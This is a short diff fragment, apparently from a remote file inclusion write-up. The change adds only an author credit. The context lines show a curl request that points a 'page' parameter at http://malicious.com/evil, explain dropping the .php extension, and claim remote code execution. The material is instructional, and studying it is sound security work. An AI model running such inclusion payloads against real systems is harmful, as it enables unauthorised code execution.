@@ -83,3 +83,5 @@ curl -X POST "http://example.com/index.php?page=http://malicious.com/evil" -d "0
 We didn't write `evil.php` because it will say not found since it will be called as `evil.php.php` , instead I just wrote `evil` where it will then be called `evil.php`.
 
 From there I can definitely get RCE
+
+**By tahaafarooq**
